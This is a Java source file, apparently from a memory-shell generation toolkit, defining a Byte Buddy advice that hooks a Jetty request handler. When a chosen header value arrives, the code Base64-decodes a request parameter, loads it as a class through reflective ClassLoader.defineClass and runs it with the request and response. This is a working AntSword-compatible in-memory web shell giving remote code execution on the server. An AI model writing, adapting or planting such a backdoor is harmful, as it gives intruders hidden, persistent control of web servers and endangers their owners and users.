package com.reajason.javaweb.memshell.jetty.antsword;

import net.bytebuddy.asm.Advice;

import java.lang.reflect.Method;

/**
 * @author ReaJason
 */
public class AntSwordHandlerAdvisor {

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 1) Object baseRequest,
            @Advice.Argument(value = 2) Object request,
            @Advice.Argument(value = 3) Object response
    ) {
        String pass = "pass";
        String headerName = "headerName";
        String headerValue = "headerValue";
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null
                    && value.contains(headerValue)) {
                baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                byte[] data = null;
                Class<?> base64;
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                try {
                    base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
                } catch (Exception var6) {
                    base64 = Class.forName("sun.misc.BASE64Decoder", true, Thread.currentThread().getContextClassLoader());
                    Object decoder = base64.newInstance();
                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
                }
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
                Object instance = payload.newInstance();
                instance.equals(new Object[]{request, response});
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}